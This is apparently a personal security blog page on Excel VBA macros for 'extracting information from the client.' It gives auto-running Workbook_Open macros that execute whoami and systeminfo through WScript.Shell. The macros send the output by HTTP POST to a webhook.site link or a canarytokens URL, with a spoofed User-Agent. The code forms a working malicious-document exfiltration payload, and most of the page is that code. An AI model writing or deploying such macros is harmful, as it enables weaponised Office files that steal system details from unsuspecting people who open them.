# Excel and Macros

### Introduction

Macros on Excel allow a user to run Visual Basic Code in the background of a document. This section of my website will be dedicated to playing around with macros, and finding ways to extract information from the client.

### Setup

In order to create a Excel file that we are able to create macros, we will have create a file with an extension of ".xlsm". This version of Excel has macros enabled, and will allow us to make and edit macros on it. This file version should be standard in Excel, so in order to do this, you just have to create a file and save it in the ".xlsm" format. Under the View tab, you will see Macros, and from there you can edit the macros.

### Popup Message

We can create a popup message that will appear when somebody enables the macros when they first open the document.

```cpp
'Code gotten from https://analysistabs.com/excel-vba/run-macro-automatically-opening-workbook/'
Sub Auto_Open()
    Msgbox "Popup Message Here"
End Sub
```

### Print Desktop Name

We can use the Visual Basic code to display the name of the Desktop to the screen when macros are enabled.

```csharp
'Source: https://www.youtube.com/watch?v=e2icQFxhp3w'
Sub Workbook_Open()
    Set Excel_Shell = CreateObject("WScript.Shell")
    Set Excel_Shell_Exec = Excel_Shell.Exec("whoami")
    MsgBox (Excel_Shell_Exec.StdOut.ReadAll)
End Sub
```

We have to copy this code under Microsoft Excel Objects in order to get it to work.

![On the right top we can see where the code will be edited](../.gitbook/assets/screenshot-2021-03-06-150627.png)

After this you can save and exit the Excel file. When you open it again, there should be a popup with the Desktop name.

### System Information Exfiltration

This code is meant for Windows systems \(tested on Windows 10\), and sends the output of the "systeminfo" command on Windows to an external website, where you can read it by entering your own web-hook link. The client will notice the Command Prompt pop up for this code.

```csharp
Sub Workbook_Open()
    Set Excel_Shell = CreateObject("WScript.Shell")
    Set Excel_Shell_Exec = Excel_Shell.Exec("systeminfo")
    'Source: https://stackoverflow.com/questions/158633/how-can-i-send-an-http-post-request-to-a-server-from-excel-using-vba'
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    Url = "your https://webhook.site link"
    objHTTP.Open "POST", Url, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
End Sub

```

### Integrating Canary Tokens

Canary Tokens are a way to track an IP address when they do a certain task. This could be accessing a website or even requesting a DNS hostname. We can use the previous code and incorporate a Canary Token into it.

```csharp
Sub Workbook_Open()
    Set Excel_Shell = CreateObject("WScript.Shell")
    Set Excel_Shell_Exec = Excel_Shell.Exec("whoami")
    'Source: https://stackoverflow.com/questions/158633/how-can-i-send-an-http-post-request-to-a-server-from-excel-using-vba'
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    Url = "http://canarytokens.com/static/about/your_own_token/contact.php"
    objHTTP.Open "POST", Url, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
End Sub

```

In line 6, we can see the canary token being used. Once we access the token, it then sends the information to the email or web-hook we have used initially. Our output should look like this:

```csharp
{
  "manage_url": "https://canarytokens.org/manage?token=Took_this_out&auth=Took_this_out",
  "memo": "Website Accessed ",
  "additional_data": {
    "src_ip": "Your IP",
    "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
    "referer": null,
    "location": null
  },
  "channel": "HTTP",
  "time": "2021-03-07 20:25:36 (UTC)"
}
```

